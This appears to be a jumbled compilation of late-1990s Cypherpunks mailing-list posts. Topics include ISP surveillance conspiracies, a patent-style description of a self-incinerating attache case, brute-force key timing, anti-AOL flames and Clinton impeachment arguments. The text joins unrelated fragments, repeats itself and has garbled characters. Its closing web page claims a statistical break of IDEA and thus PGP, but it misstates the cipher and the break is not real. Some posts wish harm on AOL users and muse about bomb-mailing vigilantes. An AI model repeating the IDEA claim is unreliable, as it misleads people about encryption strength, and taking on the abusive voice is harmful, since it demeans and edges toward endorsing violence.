Sure bet the "EOP" was jerking Softwar's chain, observing one or two levels deeper what he reports he was getting from his ISP.
Such reconnaissance by fire is customary practice, according to multi-level logs of the snoopers prowling the finer-grained
log levels down to what semi-skilled ISPs are able to keep track of, report on, and fend the prying devils/customers off with.
Watch out, though, for the deepwatchers of the recon teams
sent out as freshmeat from compsec training bases of the infrastructure
protection farms, some working for, running ISPs. Some of the recon by fire teams are bait the CI meanies use to snare those working both sides, you know, the venerated old salts "who set up Arpanet" and their hotshot inheritors at the best universities and tanks in the country convinced they know what's best for the churchgoers of techno future.
Software mentioned the name of one of them advising on how to do this, though it's not clear that Smith knew who he was inadverdently passing over while he was avidly trying to catch mechanical rabbits sent out to run the inbred speedsters ragged chasing easy prey, not knowing, not caring, they're on a track, just displaying they're trained to hang in there in sniffing
range of the bunny's ass: Brown, Foster, Podesta, Hillary, Bill.
EOP is not only what it's reported to be. Nor is any address that's
readily traceable. Onion layered they are, more than NRL knows.
Bet Anonymizer is not only what it's reported to be, that is, the semi-sharp operators don't know what it's being used to onion.

You can accomplish the same thing by encrypting your private key (including

guaranteed entropy.  Something like: "Aarhous mocrader Fals paca rate

A piece of luggage in the form of an attache case is equipped
with destruct means for destroying the contents therein in response to an
intentionally given signal. The interior of the case comprises a
compartment in the form of a metallic box with a cover, which box when
closed serves as a combustion chamber to incinerate the contents therein
when so desired. Fuel and electric igniter means are placed within the box
and ignition current is supplied by a power pack housed in the attache
case. A heat insulation barrier surrounds the box and prevents transfer of
combustion heat to the walls of the attache case. The circuit
interconnecting the electric power pack and the igniter means includes a
number of normally open switches arranged in series; all of which must be
closed to initiate and start the destruct cycle. One switch is closed in
response to closure of the attache case, and others may be deliberately
closed by key means or the like. The final switch is closed by a pushbutton
in the vicinity of the attache case handle, whereby the carrier of the case
may set off the destruct cycle by manipulating the pushbutton with a finger

Being paid to be paranoid, I prefer to use averages instead of
absolutes.  So your numbers would then be:
56 bits -- ( 2^56 / 3.88E12 )*0.5 = 2.6 hours
64 bits -- ( 2^64 / 3.88E12)*0.5 = 27.5 days
80 bits -- ( 2^80 / 3.88E12)*0.5 = 36.5 years
128 bits -- ( 2^128 / 3.88E12)*0.5 = 1.4E18 years.
So a brute force on a 56 bit key would take, on average, 2.6 hours--
using your computational power assumption below-- with half of all
keys brute forced being found before that time and half being found
after that time and most being found around 2.6 hours.  This is
assuming a fairly random distribution of keys within a large set of
keys to be attacked.  You can meter your level of safety by changing
the minimum average percentage of keys found (50%, 25%, 75%) to your
taste (or management's taste) or by increasing the key size.

(GREEB) and 72-year-old Johnie Wise were convicted for sending electronic e-mail to President Clinton and several
other federal officials... warning they were ``targeted for revenge''. Sixty-three-year-old Oliver Emigh (EM-EE) was
acquitted of all charges. The jury also found the trio NOT GUILTY of plotting to use modified cigarette lighters to fire
cactus needles... tipped with a biological poison. Grebe and Wise will be sentenced in January and face a maximum
penalty of life imprisonment.

I am not sure, but is this an idea to put the 3 line RSA Perl
implementation in the classified adds? (as near as I could gather
trying to

Yes.  The reference was to the 3 line RSA Perl implementation in ads. Didn't seem to get as an enthusiastic response as back in late summer.

Probably. Under RICO and associated laws they can get anyone for anything.
Well, except Komrade Klinton.
One partial solution I see is to rewrite premail in C so it runs at a
respectable speed[1], fix some of the bugs[2], integrate it with more
mailers, and then encourage everybody to subscribe through nyms. I'd love
to see them try to prosecute users at nym.alias.net by presenting a court
order to Community Connexion in Oakland. ;) [1] Yes, it's really slow on slower machines. [2] One of the most obvious is when Premail sends out 3 copies of a
message for a 2 remailer chain, 9 copies for a 3 remailer chain, something
like 27 for a 4 remailer chain, and so on. If nothing else, that's a
security hole which allows people to know how many warrants they will
need.

@_subject: Revenge of the AOLHoles 
AOL makes it easier to communicate. This has the intended side effect of
attracting every moron with a home computer. Thus, AOL has a
disproportionate number of morons. They get what they ask for. The problem is that most of the AOL users who publish to the net seem to
be morons. They use some annoying Russo-Germanic quoting style, they can't
use English, they're clueless, they post off-topic, or something else. Examples of AOL catering to morons:
1) "AOL is the Internet!"
2) Using the fact that their software *says* "You have mail!" as a selling
point.  3) They use a platform-specific client package. Further, "AOL is the
Internet,"  therefore AOL-specific conferences and newsgroups must be "on
the Internet" or "on the net" *and are advertised that way*. Uhh...
4) They make no effort to educate their lamers...err, users.
5) They send out tons of "free trial" disks, trying to snare every idiot
they can find.
6) They make their service as easy to use as possible, which is fine,
except that it attracts people who don't have the mental capacity to use
it when they venture outside of AOL. Witness the drek they pour onto the
Cypherpunks list.
I'm sure Mr. May could expand on this with a few dozen additional points,
if not a few hundred.
Now maybe this stuff is good marketting practice, but it's a lousy way to
serve the community which gives them life. It's the equivelent of a swim
coach bringing his students to a public pool and instructing them to
release their bowels whenever they feel the urge. If you use a site which
caters to morons, expect to get treated like one, especially if said site
celebrates the fact that they're defecating in the pool.
They've earned the stereotype that they have.
While we're at it, maybe some of the statistics-types out there can
analyze the archives for, say, the last month. Remove postings, if any,
which are routed through an anonymous remailer at AOL. Then remove random
or systematic spam (ex: the New York Times, that Javascript
"child-molester" exploit). Then compare the number of clueless postings to
Cypherpunks by AOL users to the number of useful and on-topic postings to
Cypherpunks by AOL users, and compare that ratio against other ISPs. When
determining clueless postings, include postings which use Russo-Germanic
("<< >>") quoting, or which are completely off-topic (ex: "how u do
that"). Count postings which are clueless but were originally from another
site and got forwarded here as originating from the original site. Maybe
repeat for Juno and Hotmail. Exclude flames and subsequent discussions
concerning these clueless postings (ex: don't include AIMSX's response or
this response in either category). Then again, there probably isn't any need.

@_subject: Impossible Analysis Paper at Crypto98 
This was presented at the rump session and apparently there is no paper
writeup yet.  Biham's home page at has a place you can register to be notified when new material comes out.
With conventional differential cryptanalysis, you look for pairs of inputs
which have differences (xors usually) such that after a certain number of
rounds, the ciphertexts have certain differences with excess probability.
With "impossible" differential cryptanalysis, you look for inputs with
differences which lead to ciphertext differences that are "impossible",
or at least have reduced probability.  It's the same basic idea but
you look for diminution rather than enhancement of the probability of
later differences.
Because of the reversal of the effect, the techniques for identifying
differentials, exploiting them, and designing against them are
rather different.  As a result ciphers which were designed to resist
differential cryptanalysis may be vulnerable to impossible differentials.
This technique has apparently led to an improved attack on SkipJack,
announced on Biham's web page above as "coming soon".  There was also
a moderate improvement in attacks on reduced-round IDEA (not effective
against the full number of rounds though).  At Crypto everyone was
scurrying off to see if any of the AES candidates could be knocked out
by the new technique.

@_subject: Clinton's fake apologies 
The annoying thing about Clinton's recent behavior is that he never
comes right out and apologizes, but the press always says he does.
Case in point:
But what did he say?
He didn't say that he had sinned, he said that there wasn't a fancy way
to say that he had sinned.  He never came right out and said, "I have
Another example:
But he didn't ask publicly for the forgiveness of Lewinsky.  He said that
he had already asked her for forgiveness.  Is this really true?  Has he
really spoken with her?  Or is it another lie?
Another example, from while Clinton was in Ireland:
Here's what he actually said:
The wording is not quite as obvious here, but in the video record it was
clear that he was saying that he had already said that his behavior was
indefensible and that he was sorry about it.  Of course, this is not true,
he had never said that.
Knowing Clinton's lawyerlike mind, we can only assume that his wording
is carefully chosen.  He could easily have said, "I don't think there is
a fancy way to say it, but I have sinned," or, with regard to Lewinsky
and company, "I ask here for forgiveness from them all."
No doubt he takes a measure of satisfaction in knowing that his calculated
public contriteness is carefully arranged to make it seem like he is
saying things which he actually is not.  Clinton loves lies, and it
must be thrilling to lie brazenly and to be praised for his openness
and honesty as he does so.  For a professional hypocrite like Clinton,
there can be no greater reward.

How about a line-of-sight (LOS) infrared network, a neighbor-net?
Always thought this could be a method for a local technical
entrepreneur to fund and share their personal T-1 link or for
some small network enterprise to avoid local and US federal regulations and compete with the big cable and telephone companies. Appears that LOS infrared is currently unregulated
and could be encrypted.
Get enough people in a neighborhood to put LOS infrared relays on top of their houses, allow them to tap in, and feed this neighbor-net from some central point that is equipped with a more conventional link.
I dunno why infrared, which theoretically has much more capacity than a phone line or coax cable, seems currently so slow,
 i.e., less than 10 MB in many commercial offerings. Iï¿½ve no cost estimate for the roof top boxes. Heavy wet weather, fog, rain, snow obviously can affect LOS infrared, esp. low power.
Personally, I would like more choices than just the phone and cable lines, especially something that is locally controlled. However, I imagine that if any significant traffic was generated over such infrared or wireless neighbor-nets,  the Feds would eventually step in and regulate them.  They'd probably want to regulate the traffic over a taut string, between paper cups.

Sure they do. They can use a different mail reader. (After all, 32-bit AOL
allows AOL users to use all the TCP/IP protocols...) They can cut and
paste manually, or, probably best, they can go to another ISP. I understand what you're saying, Ryan, and I understand what they're
saying, but there all alternatives out there; they just don't want to use
them. In fact, they've installed proprietary packages that do this. There
are plenty of free alternatives out there which don't have this problem.
If my ISP pushed a bunch of proprietary software down my throat, I'd find
another ISP. That goes double if the proprietary software sucks. That goes
triple if the software sucks and the ISP is trying to get every idiot they
can to use it. (I got a "100 hours free network abuse" disk in the mail

@_subject: Larry Gilbert, AOLers, and the Hyper-real flamer 
I know of several people in addition to myself who have complained to
Sixdegrees about this. I've personally given up sending complaints back to
them, and I lost count at 5. Sixdegrees simply ignores them. I've sent
them to their upstream sites, and they either ignore them or tell me that
they've forwarded them to Sixdegrees. My complaints, at least, were very
civil. One explained exactly what a mailing list was, for crying out loud. I can't speak for Hyper-real's (if he sent any) and the others. You may be
able to use that defense if Sixdegrees didn't know, but they do. Sixdegrees could avoid these problems very easily by adding a domain
verification so that somebody from Netcom can't specify some address at
toad.com and have it work. They haven't. They haven't because they don't
care. Saying that some sites have screwed up rDNS and mail domains isn't a
valid excuse. They can insert exemptions for Hotmail, MSN, Juno, and other
sites like that if they want. Oh, maybe they have a "phobia" of this, just
like AOLers apparently have a "phobia" of even making an attempt to use
English properly, so it's okay. I don't think the parallel between the AOL users spamming the list and
organizations like Sixdegrees spamming the list is that uncalled for
either. Maybe you find any drawing of parallels offensive, Paul, and maybe
you'll denounce it as "propoganda" because I might use an example in this
message, and maybe you just really like AOL and think its cluelessness and
broken software is the best thing since sliced bread, but that doesn't
change the fact that Sixdegrees and friends are doing the same thing AOL
is and that it's abuse of the network. They fire a salvo, and somebody
else fires one back at their expense.
By this logic, I'd next expect to read a claim that since the AOLers are
getting the Cypherpunks address from somewhere, we should welcome their
requests for band stickers and things like "how u do that." After all,
they're the victims, and are probably the kind of people who go to look up
the word "gullible" when somebody tells them it isn't in the dictionary.
It's a long-established tradition to flame people like this. Some flames
are better than others. Maybe if the Hyper-real user insults them enough
they'll finally add Cypherpunks to their block list. I've personally grown real sick of seeing bullshit passwords, welcome
messages, new password messages, updates, and other junk on this list from
sites which don't bother to verify domain names. I can give them that, but
I start to get pissed when they refuse to block the address. For that
reason I don't mind the person or persons who are flaming these idiots and
in fact, like Mr. May, I cheer them on. Personally, I *WANT* them to pour
nitric acid into their computers to destroy them, so they get the hell off
the net. Maybe they're scared of block lists. After all, they're similar to kill
files which we all know are lists of people who need killing and since
murder is illegal and immoral kill files must be too.
Paul, maybe you don't mind somebody pouring grass killer on your lawn if
they were submitted your address over the phone and made an "honest"
mistake and fell victim to a prank, but I mind if they do it to mine,
particularly since all they have to do is perform cursory checks to
realize it's suspect. Oops, I made an example using a different subject
matter. We're in the "blatant propoganda" stage now, I suppose. Now, since you're all for niceness in the world, you can go jump on Tim

Unexpected by you, perhaps, but expected by everyone else.  The complexity
of the expressions should increase exponentially with the number of
rounds.  Extrapolating from two and four round results to eight and
sixteen is the wrong model.  (You can artificially suppress this by
introducing new variables for each round, but that doesn't change the
underlying complexity of the problem.)
Can't you come up with a back-of-the-envelope estimate for the number of
terms in your sixteen round expression?  Even without fully optimized
S-box expressions this information would be useful.  If it is greater than
the number of atoms on Earth then it would be a strong hint that this
approach won't work.
If you really want to attract money you need some kind of numbers to show
that the approach has a prayer of working.  Show the size of the problem
you will get, estimate how much improvement you'll get with your improved
S-box representations, compare it with the problems tackled by available
combinatorial algorithms.  You should be able to do this with a few hours
of work, at least to show that the basic concept is sound (or unsound).

Nothing on this end filters unless it comes from/to:

I filter these because the dumbshit's at mosexpo.ru keep sending messages
with munged headers that fill up postmaser's mailbox with delivery failure
messages. I got tired of using the 'd' key. But even in this case, I only
filter *after* I've forwarded the traffic to the other nodes.
The only other quirk I'm aware of regarding anon posts are ones without
subjects, in which case I get a notice that the Japanese node is dropping
it because it doesn't have headers. This should come as no surprise as I've
made mention several times on this issue.
The post I made earlier went through without a problem, but as I mentioned in my original post I had made several anon posts through replay.com to cypherpunks at ssz.com and they never made it to the list.
I also noticed that replay.com seems to be striping the subject from the posts as in my last post I *did* put a subject line on the message but it arrived to the list without one.
In the messages I sent, a couple of them I used a chain of remailers but when they failed to appear I sent the remaining messages through replay.com only (using the https interface to send the messages).
It may have just been a problem on replay's end but on all the posts I did get a conformation page that the messages had been accepted.

Separation of church and state was established by jefferson not as a
quote from the constitution but as a summary of the religious parts of
it.  It was written in a letter to baptists in massachusets.  He also
sent a copy of it to his postmaster general and attorney general for
proofreading to make sure it was a legal summary and correct.  You can

@_subject: Larry Gilbert, AOLers, and the Hyper-real flamer 
You're right.
We have very high opinions of ourselves. We have low opinions of people
who use AOL because they're typically scum, spammers, or idiots. You even
admit this by saying "there are a FEW intelligent people on AOL." They're
also paying $20/month for a shitty service with a bad reputation.
If you don't like the stereotype, get your fellow AOLers to get a
clue and reverse it which will probably take years if it's possible at
all, or if you're actually an intelligent AOLer, go get an ISP which
isn't synonymous with manure.
Personally, I'm figuring very, very few AOL users who publish actively to
the Internet have a clue. The traffic on this list just over the last
month backs that up. The reputation AOL has is deserved, and there is a
definate pattern of stupidity from AOL.
In the future quote so we know what you're talking about, and don't use
the "flick off the Internet" quoting style, either.
I'm not sending requests for band stickers to cryptography lists. I'm not
sending messages to cryptography lists which read "how u do that" with no
punctuation. I'm not asking members of cryptography lists to sign me up to
receive the news by email every morning. I'm not replying to things while
not quoting, or by using some quoting system which was designed by AOL for
the purpose of pissing off non-AOLers.
I'm not publishing web pages which are unreadable without the latest
shovelware from Microsoft or Netscape, and which shoots the finger
otherwise. I'm not saying "AOL is the Internet," and I'm not signing up with a
service because they send me a free mirror or coaster or because I'm too
lazy to learn to do anything other than point and click.
Not everyone else, but infinitely better than the average kool d00d,
AOLer, or webber, and infinitely better than the president who the
"average" American elected.
By the way, the sentence I quoted above is what is known as a question. In
English, you use a question mark for those.
I won't have anything to do with it, but I'm fully expecting for some new
Unabomber to appear within the next few years. Instead of targeting
technology centers like the Unabomber did, this guy will mail bombs to
spammers, people who send "how u do that" to lists, etc. I, thankfully, am
morally constrained enough to never do anything like that, but I would bet
that there is somebody out there who isn't. easily conclude that AOL is a haven for wannabes, lamers, and k00l D00dz
\/\/h0 tiPE l1|<E Th1s, but since AOL _is_ the Internet and is so filled
with intelligent people, I suggest you go back there and leave all of us
who are just deluded into thinking we're using the Internet and who only
think we know about our professions and hobbies.

Rather than merely writing to say what bozos all the list members
are (unfairly stereotyping us all - even those not from AOL :-),
why don't you give us the benefit of a little of your expertise?
Why do you believe the perjury case has `reasonable doubt' problems?
{Were I on a jury and if convinced that matters are as Starr
presents them, I would have no problem deciding that Clinton lied
in the deposition at least, where the term `sexual relations' seems
to have been carefully and explicitly defined - even assuming that
he /shouldn't/ be convicted on what seems a clear intent to deceive
the court and later the grand jury on multiple points.}
And the abuse of power case seems thin even to a non-lawyer.  But
where does the `executive privilege stuff' come in?  I don't see
that Starr listed that among his possible grounds for impeachment.
And what about obstruction of justice?  Do you see any merit to those
Inquiring minds want to know.

On Feb. 1, 1996, the US House of Representatives
voted to pass the Telecommunications Reform Act. This Act included the Communications Decency Act,
which sought to criminalize posting to the
Internet any material deemed indecent and patently
offensive, with no exception for socially
redeeming material. On Sept. 11, 1998, the US House of Representatives
voted to release the Referral of Independent
Counsel Starr on the Internet. 365 individuals were Members of Congress during
these two votes, 196 Republicans and 169
Democrats. Of that total, 284, or 77.6%, voted Aye both
times. 185 of the Republicans, or 94.4%, voted Aye both
times. 96 of the Democrats, or 56.8%, voted Aye both
times. Had the Communications Decency Act withstood
judicial review (which it did not), posting the
Starr report to the Internet arguably would have
subjected the posters to fines of $250,000 and 5
years in prison. The question of who voted for both the CDA and the
release of the Starr report is not cut-and-dried,
because Congress did not record a roll-call vote
for the CDA in isolation, but only for its vehicle
the Telecommunications Reform Act. Also, the vote
Friday to post the Starr report was primarily a
vote to start up impeachment machinery. Nevertheless, if accountability to the voters
means anything in this democracy, the Congress
members who voted "Aye" on both February 1, 1996
and September 11, 1998 ought to come in for a bit
of uncomfortable public exposure.

Watch TV and learn the answer.  It's only perjury if it's material,
and the judge said it wasn't material.
Among the grounds Starr listed was Clinton's attempt to delay the
investigation by raising many legal objections. He claimed privilege,
for example, with respect to Secret Service testimony.  Most of his
efforts were ultimately overruled.

@_subject: Clinton still doesnt get it 
This doesn't speak to `reasonable doubt' which was the subject
under discussion.  Or are you arguing that a defense to perjury
is that there is reasonable doubt that a question was material?
Go watch TV and report back with the answer.
Yes, but I assumed Mac had included this under the `abuse of power'
heading since he explicitly cited that topic in his message to which
I was responding, and since that appeared to match one of the broad
headings under which Starr classifies his possible `grounds for
    "...that President Clinton's actions ... have been inconsistent     with the President's constitutional duty to faithfully execute     the laws. "
I see nowhere that Starr claims that it was illegal/impeachable for
Clinton to have claimed executive privilege.  He merely notes that
Clinton used it (extensively) along with a bunch of other tactics to
delay and impede the investigation.

@_subject: The AOL Chronicles 
Every time one of these AOL wars start, the AOLers claim that there are a
few intelligent people on AOL and that our shunning of them based on
statistics is unjustified. We all know what the statistics are, but I
don't think anybody has done this for Cypherpunks yet. It has been done
other places. This isn't scientific with margins of error and everything,
but it's good enough to illustrate the point.
I went through every posting originating from AOL which was sent to
Cypherpunks between July and September 16th, which is today. I classified
postings as either "clueful" or "clueless," with the latter determined by
relevance to the list, literacy, quoting, and whether it makes any sense
at all. Anything completely stupid is also classed as "clueless."
"Clueful" is anything which is even remotely relevant to the list, and
includes quoted material if a followup. In addition, if an AOL user sends something clueless to the list then gets
flamed, that posting and any subsequent postings in that thread by the
original author are counted as clueless unless it's an apology, at which
point it isn't counted at all. The flames of said user are counted as
defense, not as clueless. Also, if I looked at the message but couldn't
tell what the hell the author was talking about because he didn't bother
to quote, I classed the posting as clueless. A "*" denotes that the portion I quote is the entire message. A "+" denotes that there was either no quoted material in the message or that it
used the "<<>>" style. Keep in mind that messages which are original would
not have quoted material, but still have a "+". A "H" means that it
contained HTML. I removed all new lines from the quotes to make them more
compact. If the posting was large, I quoted only some parts. Clueless posts from AOL:

I agree totally, but this has a somewhat deeper point.
The idiots in government sign into law all sorts of unconstitutional or
nonsensical legislation. As far as I'm concerned, it ought to be a law
that for *ANY* crime they commit they are thrown out of office and
prosecuted to the fullest extent of the law. Of course it would never
happen, but if it were to happen I think we'd see massive repeals of all
this bogus legislation.
"Senator, you have an encrypted file on your laptop. As per the Domestic
Cryptography Prohibition Act, I am here to seize your computer, the office
it is in, freeze your assets, and take you into custody. You will be
ejected from the Senate, effective immediately. If convicted, you will
spend the next five years at hard labor."

Later that night, on the news: "Senator X was ejected from the Senate,
arrested, jailed, and charged today with unlawful possession of random
numbers. Later it was announced that former Senator X was charged with
trafficing in child pornography."
The next day: "In a daring no-knock morning raid, a flurry of automatic
weapons fire occured and former Senator X's family was killed in the
exchange. An FBI agent was quoted as saying, 'She was wielding an assault
baby and we had to take her down.'"
"It has just been announced that former Senator X is being charged under
the Domestric Cryptography Prohibition Act, which he sponsored, with
'crypto in a crime.' This carries an additional penalty of 10 years. When
asked what crime the cryptography was used in, an FBI representative
answered, 'Given what Senator X argued on the floor of the senate when he
introduced this bill, we're sure there is child pornography there
somewhere. Like he said, the only reason to use cryptography is if you
have something to hide, like child pornography or plans for widespread
global armageddon. Because he used cryptography, we don't know where or
what that porn is, but we're sure it's there somewhere.'"
Three years later: "Former Senator X was convicted today of one count of
'crypto in a crime,' five counts of possession of cryptography without a
license, eight counts of child porn (one for each encrypted file), and one
count of intent to use weapons of mass destruction. In a swift action, he
was sentenced to six consecutive life terms, to be served at hard labor."

So I fly home Friday from San Jose.  Probably because I was
in a hurry, after walking through the magnetometer and x-raying
my stuff, a security dude grabbed my laptop and said he wanted
to 'analyze' it.  Yeah sure whatever, I decided not to protest
I was late for my flight.
This analysis, it turned out, was wiping a coffee filter over the strap
of its bag, and sticking the coffee filter into a slot on a machine.
No solvent even.  The machine had columns labelled TNT RDX NITRO PETN HMX.
I recognized the first four as high explosives.  Later, I wondered
if people with angina (who take nitro orally) ever set this off.
Most of them, of course, are not bearded eastern-european/semetic
guys in their 30's who look worried and in a hurry.
Anyway, that was it, and I made my flight.  Didn't even open
the laptop's case.  The machine name was ION-something; I wonder whether it sucked vapors
from the fiber disk or whether it was a neutron-spectrometer (?) device.
(Had this been a UK Customs 'inspection' of the contents of the disk, I
might have had to explain the half-gig of "noise" I have on the disk.
Only, it really is noise. Really.)
Anyway, the moral of the story: Don't store your laptop with your explosives :-)

Go to a bookstore and buy an introductory book on C programming. It might
cost as much as $50, but it is more than worth your while if you are
planning on messing with cryptography and cracking like this.
Once you have the book, read it and then try to analyze the source code. If you are dealing with and using Windows, you will need a C compiler. Cygnus has a free Win32 C compiler out as I understand it, and Microsoft
and Borland both have C compilers out for a few hundred bucks each.

@_subject: IDEA(tm) weakness? 
Title: Privacy Page
How private is your electronic communication ?
  [taken from the PGP FAQ]
  You should encrypt your e-mail for the same reason that you don't write
  all of your correspondence on the back of a post card. E-mail is actually far less secure
  than the postal system. With the post office, you at least put your letter inside an
  envelope to hide it from casual snooping. Take a look at the header area of any e-mail
  message that you receive and you will see that it has passed through a number of nodes on
  its way to you. Every one of these nodes presents the opportunity for snooping.   Encryption in no way should imply illegal activity. It is simply intended
  to keep personal thoughts personal. Do you trust your mail servers/gateways/virtual
redirects ?
  With the increasing use of virtual email accounts which allow you to keep the same
  email address no matter if you change jobs, ISPs, etc, the opportunity for snooping
  increases. Is PGP secure ?
  PGP uses acombination of IDEA, RSA and MD5. RSA is used to allow the transfer of
  session keys and MD5 is used to generate a unique message digest from the passphrase for
  generating the IDEA key and signatures. IDEA is the core algorithm used to encrypt the
  actual message. Thus the security of IDEA is also means the security of PGP .
Is IDEA secure ?
  The IDEA algorithm (patented by ASCOM) is the core algorithmm
  used in PGP. It is based on a rotating 128 bit key split into 16 bit segments. The
  algorthm converts 64 bits of data at a time using the following operations '+', '^'
  (exclusive-or) and '*'.
  The formulas are :
  64 bit data => D1, D2, D3 and D4 (all 16 bits)
  => K1,K2,K3....rotating extra 25 bits after all 128 bits are
  used
  There are 2 phases in each round and 8 rounds in total + 1 final
  round of just phase 1.
  Phase 1:
    R1 = D1 * K1
    R2 = D2 + K2
    R3 = D3 + K3
    R4 = D4 * K4
  Phase 2:
    E1 = R1 xor (((R2 xor R4) + ((R3 xor R1) * K5)) * K6)
    E2 = R3 xor (((R2 xor R4) + ((R3 xor R1) * K5)) * K6)
    E3 = R2 xor ((((R2 xor R4) + ((R3 xor R1) * K5)) * K6) + ((R3 xor R1) * K5))
    E4 = R4 xor ((((R2 xor R4) + ((R3 xor R1) * K5)) * K6) + ((R3 xor R1) * K5))
  Given a large random data message (ie 1000 samples - 64*1000 =
  8Kb file). The distribution of the above operations can be used to break the key. ie both
  the '+' and the '^' operations give an even distribution but the '*' operator gives a
  biased distribution towards '0'.
    Distribution (where '*' has a bias towards 1 of a)     R1 = a
    R2 = even
    R3 = even
    R4 = a
    (a5 & a6 are the bias for K5 and K6)
    E1 = (bias a5) * (bias a6)
    E2 = (bias a5) * (bias a6)
    E3 = (bias a5) - (2 * (bias a5) * (bias a5) * (bias a6)) + ((bias
    a5) * (bias a6))
      = (bias a5) * (1 + (bias a6) - (2*(bias a5)*(bias a6)))     E4 = (bias a5) - (2 * (bias a5) * (bias a5) * (bias a6)) + ((bias
    a5) * (bias a6))
      = (bias a5) * (1 + (bias a6) - (2*(bias a5)*(bias a6)))     Also as the '*' operator is biased towards its own bit for the
    result '1' - approx (60% to 100% depending on bit position). [Working from the low bit
    upwards will provide an even greater approximation as then you would have the relevant Key
    bits against a random data. ie for 1st bit, it is 100% dependant on the bit for a '1',...]
    eg using a simple 3x3 matrix on second bit, gives (only
    demonstrating the ratio):
    ï¿½ï¿½ï¿½ï¿½ if K bit is 1 => bias a ~ (2/8), if K
    bit is 0 => bias a ~(1/8)     ==> We can determine when :
      K5=0 and K6=0 as (bias a5) and (bias a6) will be at their highest
        ==> E1 & E2 are highest
      K5=1 and K6=1 as (bias a5) and (bias a6) are at their lowest
        ==> E1 & E2 are Lowest       To determine between K5=0,K6=1 and K5=1,K6=0.         K5 can be determined by check with E3 & E4 as they are both
        equal to :
        (bias a5) * (1 + (bias a6) - (2*(bias a5)*(bias a6)))ï¿½ =>
        directly relate to (bias a5) => K5
        =>When K5=0, both E3 & E4 will be low.
        => When K5=1, both E3 & E4 will be high.

  Working backwards with these distributions you can deduce the
  key.   ie work out K5 (93..108) and K6 (109..124) from its distribution
  pattern [using just the distributions for E2 & E3, as E1 & E4 have had the '*'
  operation applied in the final phase], then with K5 and K6 work out K1..K4 (22..85). You
  now have the key values for K1 to K6 !!!. Modify the Samples such they are back a phase
  and repeat (ie for each sample work backwards using known K1..K6 to find the E1..4
  values).   MAJOR ASSUMPTION : Assume that a large random sample provides a
  close toï¿½ even distribution at the end of each phase (For E2 & E3) such that the
  bias (ie a5 & a6) used to determine E2 and E3 are the only significant factors.   Reasoning : If the distribution is not even, then it is very much
  easier to break (ie only the key values can cause the change in distribution pattern =>
  know the pattern, know the key).
  I have developed a program which does just this (NOTE: not tested
  with real PGP data, as I have not had the time to investigate how the PGP file is
  structured, ie where the IDEA code starts and ends).
  It is available under a copyleft license similar to GNU. The Java Source code can be found at
  :
  [Application will not
  be released until beginning of 1999 when enough people are
  aware of the potential problem, and solutions are widely available - thus the threat to
  the general users privacy is kept to a minimal. Software houses which would like a delay
  in the release of this application so as to provide a solution should email: SGOSHA33 at mailexcite.com with their request]
  ï¿½
What can we do ?
  The above crack works because there is a large sample involved.
  If however you pre-encrypted the file such that you got your pre-encrypted file and a key
  file, where this key file is small and contains only the key required to open the
  pre-encrypt file. You then PGP the two files, this would make it much harder to break as
  the key file cannot be broken from the sampling technique descibed above.
  I have developed an application which does just that. It is
  available under a copyleft license similar to GNU. The Java source code can be found
  here :   kiss.zip
  To run the application you will need Java installed on your
  machine. Place the files in a directory named KISS. The command line is :
    java KISS.kiss e     ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ - encrypt
    java KISS.kiss d     ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ - decrypt (do not add
    the kiss extension to the filename)
  After encryption you will get 2 files. The '.kiss' file is the
  encrypted file and the '.lips' file contains the key used to encrypt the file. You should
  then encrypt both files with PGP.
What is in the pipeline for the future ?
  Task 1
  The above 'kiss' pre-encryption is not 100% safe from non-bruteforce cracking !!   As the majority of files encrypted are text messages which are based mainly on the
  characters 'a' to 'z' thus the Ascii codes of the characters are of the form ï¿½
  011xxxxx. From this you can see that the rotating distribution as used above will tend
  toward '1'. Thus with enough samples they can deduce the key with the simple equation.
    KeyValue xor 1 = CommonValue ==> KeyValue = !CommonValue
  To prevent this my next application (codename Stable) will be a stabiliser program
  which will ensure that the distribution of the data has an even distribution.
  Target Release Date : 30/9/98.
  Task 2
  The integration of both 'kiss' and 'stable'.

                                  [INLINE]
   How private is your electronic communication ?
     [taken from the PGP FAQ]
     You should encrypt your e-mail for the same reason that you don't
     write all of your correspondence on the back of a post card. E-mail
     is actually far less secure than the postal system. With the post
     office, you at least put your letter inside an envelope to hide it
     from casual snooping. Take a look at the header area of any e-mail
     message that you receive and you will see that it has passed
     through a number of nodes on its way to you. Every one of these
     nodes presents the opportunity for snooping.
     Encryption in no way should imply illegal activity. It is simply
     intended to keep personal thoughts personal.
   Do you trust your mail servers/gateways/virtual redirects ?
     With the increasing use of virtual email accounts which allow you
     to keep the same email address no matter if you change jobs, ISPs,
     etc, the opportunity for snooping increases.
   Is PGP secure ?
     PGP uses acombination of IDEA, RSA and MD5. RSA is used to allow
     the transfer of session keys and MD5 is used to generate a unique
     message digest from the passphrase for generating the IDEA key and
     signatures. IDEA is the core algorithm used to encrypt the actual
     message. Thus the security of IDEA is also means the security of
     PGP .
   Is IDEA secure ?
     The IDEA algorithm (patented by ASCOM) is the core algorithmm used
     in PGP. It is based on a rotating 128 bit key split into 16 bit
     segments. The algorthm converts 64 bits of data at a time using the
     following operations '+', '^' (exclusive-or) and '*'.
     The formulas are :
     64 bit data => D1, D2, D3 and D4 (all 16 bits)
     => K1,K2,K3....rotating extra 25 bits after all 128 bits are used
     There are 2 phases in each round and 8 rounds in total + 1 final
     round of just phase 1.
     Phase 1:
     R1 = D1 * K1
     R2 = D2 + K2
     R3 = D3 + K3
     R4 = D4 * K4
     Phase 2:
     E1 = R1 xor (((R2 xor R4) + ((R3 xor R1) * K5)) * K6)
     E2 = R3 xor (((R2 xor R4) + ((R3 xor R1) * K5)) * K6)
     E3 = R2 xor ((((R2 xor R4) + ((R3 xor R1) * K5)) * K6) + ((R3 xor
     R1) * K5))
     E4 = R4 xor ((((R2 xor R4) + ((R3 xor R1) * K5)) * K6) + ((R3 xor
     R1) * K5))
     Given a large random data message (ie 1000 samples - 64*1000 = 8Kb
     file). The distribution of the above operations can be used to
     break the key. ie both the '+' and the '^' operations give an even
     distribution but the '*' operator gives a biased distribution
     towards '0'.
     Distribution (where '*' has a bias towards 1 of a)
     R1 = a
     R2 = even
     R3 = even
     R4 = a
     (a5 & a6 are the bias for K5 and K6)
     E1 = (bias a5) * (bias a6)
     E2 = (bias a5) * (bias a6)
     E3 = (bias a5) - (2 * (bias a5) * (bias a5) * (bias a6)) + ((bias
     a5) * (bias a6))
